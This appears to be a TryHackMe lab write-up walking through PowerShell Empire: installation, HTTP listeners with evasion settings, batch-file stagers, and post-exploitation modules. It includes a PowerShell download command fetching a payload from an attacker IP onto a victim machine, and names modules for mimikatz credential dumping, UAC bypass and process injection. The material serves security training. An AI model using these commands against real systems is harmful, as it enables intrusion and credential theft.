---
title: "RP PS Empire - TryHackMe"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "RP: PS Empire - TryHackMe writeup"
---

# RP: PS Empire

[TryHackMe | RP: PS Empire](https://tryhackme.com/room/rppsempire)

![https://i.imgur.com/0xn4lAt.jpg](https://i.imgur.com/0xn4lAt.jpg)

PowerShell Empire is a powerful post-exploitation framework which allows us to perform various functions such as privesc, password gathering, situational awareness, and many more!

Link to the official website: [https://www.bc-security.org/post/the-empire-3-0-strikes-back](https://www.bc-security.org/post/the-empire-3-0-strikes-back)

Clone the following GitHub page and run the initial setup script.

[https://github.com/BC-SECURITY/Empire/](https://github.com/BC-SECURITY/Empire/)

## [Task 2] Install

**#1 cd /opt**

```bash
Question Done
```

**#2 git clone [https://github.com/BC-SECURITY/Empire/](https://github.com/EmpireProject/Empire)**

```bash
Question Done
```

**#3 cd /opt/Empire**

```bash
Question Done
```

**#4 ./setup/install.sh**

```bash
Question Done
```

**#5 When prompted, enter in a server negotiation password. This can be left blank for random generation, however, you should record this somewhere such as a LastPass vault.**

```bash
Question Done
```

**#6 Launch Empire with either ./empire or /opt/Empire/empire**

```bash
Question Done
```

## [Task 3] Listeners

If you're going to play ball, first you have to learn how to catch. Similar to 'catching' a reverse shell with Netcat, we first have to set up a listener in order to properly handle any sort of agent we would install on our victim machine. Answer the following questions using the listeners help menu and then spawn a basic listener.

---

**#1 Once empire has launched, type help to view the various menus. Which menu to we launch to access listeners?**

```bash
listeners
```

**#2 Launch the listeners menu. In a manner similar to cobalt strike/metasploit, this will launch a contextual submenu. For the sake of this tutorial, we will be using an http listener in order to catch our connections. Type the command 'uselistener http' now. You can double-tap tab to view all options for listeners following typing 'uselistener'**

```bash
Question Done
```

**#3 What command can we now type to view all of the options related to our selected listener type?**

```bash
info
```

**#4 Once the information regarding the listener pops up, peruse this for some of the more interesting options we can set in order to disguise our actions more. Which option can we use to set specific times when our listener will be active?**

```bash
WorkingHours
```

**#5 Similar to changing/spoofing what browser you are using on the internet, what option can we set to appear as a different user agent (i.e. chrome, firefox, etc)?**

```bash
DefaultProfile
```

**#6 What option can we use to set the port which the listener will bind to?**

```bash
port
```

**#7 In addition to changing our browser profile, we can change what our server appears as. What option can we set to change this?**

```bash
ServerVersion
```

**#8 Launch our newly created listener on port 80 with the command 'execute'. What message is displayed following successfully launching the listener?**

```bash
Listener successfully started
```

**#9 We can verify that our listener is now active by typing what command?**

```bash
listeners
```

## [Task 4] Stagers

Stagers metaphorically and literally set the stage for post-exploitation by retrieving the remaining code and associated information necessary to spawn a full-fledged agent.

---

**#1 First, type the command 'usestager' and double-tap tab to view all options we have for stagers. Which option allows us to use a batch file?**

```bash
windows/launcher_bat
```

**#2 Let's finish our previous command and select the batch file option. Press enter to finalize this. What is our new path to the 'module' we have selected?**

```bash
stager/windows/launcher_bat
```

**#3 Since we've previously set our listener to use http, we must now set the associated options within our stager we are building to match that. What option must we set in order to accomplish this?**

```bash
Listener
```

**#4 Type execute to finish creating our stager. Where is the stager saved?**

```bash
/tmp/launcher.bat
```

**#5 Using any shell you have previously gained into our victim system transport the stager batch file to the system and execute it. This can be done in numerous ways depending on the stager used, be prepared to be flexible with your transportation methods similarly to how you might handle an msfvenom package.**

```bash
Question Done
```

## [Task 5] Agents and Post-Exploitation

Interact with our ses.. er agents and do neat things.
Download the evil file to the windows computer.

```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('[http://10.9.45.74/files/launcher.bat','C:\\Users\\Jon\\Documents\\launcher.bat](http://10.9.45.74/files/launcher.bat','C:%5C%5CUsers%5C%5CJon%5C%5CDocuments%5C%5Clauncher.bat)')"

```

**#1 First, type agents to view our registered agents.**

```bash
Question Done
```

**#2 Once you've typed agents to list the registered agents, the agents submenu will become active. Use the help menu to answer the following questions.**

```bash
Question Done
```

**#3 What command do we use to interact with an agent?**

```bash
interact
```

**#4 What about if we wanted to list any usernames and passwords we have gathered?**

```bash
creds
```

**#5 And if we wanted to 'deactivate' an agent for a while to avoid detection?**

```bash
sleep
```

**#6 How about if we wanted to delete an agent or disconnect it?**

```bash
kill
```

**#7 Moving into the post exploitation modules, what command can we use to search through these?**

```bash
searchmodule
```

**#8 We'll start with the most important module, find the module which plays a specific AC/DC song.**

```bash
python/trollsploit/osx/thunderstruck
```

**#9 What if we wanted to perform an lsa dump with a certain popular windows credential gathering tool?**

```bash
powershell/credentials/mimikatz/lsadump
```

**#10 Sometime we might not have the permissions level that we require to perform further actions, what module set might we have to use to get around UAC?**

```bash
bypassuac
```

**#11 What module family allows us to gather additional information about the network we are on?**

```bash
recon
```

**#12 Our process we have compromised might not be the most stable, how do we migrate to another process? (This will have a specific module answer)**

```bash
powershell/management/psinject
```

**#13 Last but not least, what module can we use to turn on remote desktop access for our purposes?**

```bash
powershell/management/enable_rdp
```
